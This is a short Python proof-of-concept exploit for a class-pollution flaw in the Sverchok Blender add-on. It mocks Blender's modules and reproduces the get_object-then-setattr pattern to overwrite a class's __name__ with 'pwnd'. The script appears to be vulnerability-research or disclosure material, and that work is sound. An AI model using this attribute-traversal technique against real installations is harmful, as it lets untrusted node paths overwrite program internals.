# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: SvSetPropNodeMK2.process (get_object + setattr)
# Type: get-attr-set-attr

import sys
import types

# Mock Blender dependencies
bpy_mock = types.ModuleType('bpy')
bpy_mock.types = types.ModuleType('bpy.types')
bpy_mock.types.bpy_prop_array = list
bpy_mock.props = types.ModuleType('bpy.props')
bpy_mock.props.StringProperty = lambda **kw: ""
bpy_mock.props.BoolProperty = lambda **kw: False
sys.modules['bpy'] = bpy_mock
sys.modules['bpy.types'] = bpy_mock.types
sys.modules['bpy.props'] = bpy_mock.props

# Import the vulnerable get_object function from sverchok
from nodes.object_nodes.getsetprop_mk2 import get_object

class Target: pass
target = Target()

# Make target accessible via globals in the module
import nodes.object_nodes.getsetprop_mk2 as setprop_mod
setprop_mod.__dict__['target'] = target

payload_value = "pwnd"
# Path format: list of (type, value) tuples
# get_object traverses via getattr for "attr" type
PAYLOAD_PATH = [("name", "target"), ("attr", "__class__")]

def run_poc():
  # Reproduce the vulnerable pattern from SvSetPropNodeMK2.process():
  #   obj = get_object(path[:-1])  # traverse to parent
  #   setattr(obj, value, data)    # set the leaf
  full_path = [("name", "target"), ("attr", "__class__"), ("attr", "__name__")]
  obj = get_object(full_path[:-1])
  p_type, value = full_path[-1]
  setattr(obj, value, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
